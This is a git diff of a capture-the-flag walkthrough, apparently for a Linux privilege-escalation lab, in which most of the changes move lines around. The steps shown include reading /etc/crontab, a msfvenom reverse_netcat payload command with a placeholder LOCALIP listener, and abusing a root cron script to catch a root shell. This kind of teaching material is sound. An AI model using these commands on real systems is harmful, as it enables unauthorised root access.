@@ -31,8 +31,8 @@ password = password
 
 ### 5 What is the name of the bash script that is set to run every 5 minutes by cron? 
 
-- cat /etc/crontab
 [ ! ] You should be able to find the name of the .sh file
+- cat /etc/crontab
 ![1](https://user-images.githubusercontent.com/69840849/90487765-405a2580-e17e-11ea-917b-2c482e84784c.png)
 
 ### 6 What critical file has had its permissions changed to allow some users to write to it?
@@ -68,9 +68,11 @@ password = password
 
 ### 4 Create a payload using: 
 
-- msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
 [ ! ] Reminder, LOCALIP depends on your own machine, I will be using 10.10.0.0 as an example! 
-[ ! ] In this situation, we can use port 8888. We can use another port number such as 1234 as long as the netcat listener is also set to 1234
+[ ! ] In this situation, we can use port 8888. We can use another port number such as 1234 as long as the netcat listener 
+is also set to 1234
+
+- msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
 ![1](https://user-images.githubusercontent.com/69840849/90489384-8f08bf00-e180-11ea-9dcc-e3927b6bf169.png)
 
 ### 5 What directory is the "autoscript.sh" under?
@@ -89,6 +91,7 @@ password = password
 
 
 ### 8 After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations! 
+
 [ ! ] You may use the follow to check if it worked
 - whoami
 ![1](https://user-images.githubusercontent.com/69840849/90490473-01c66a00-e182-11ea-88c6-f84af16895ba.png)
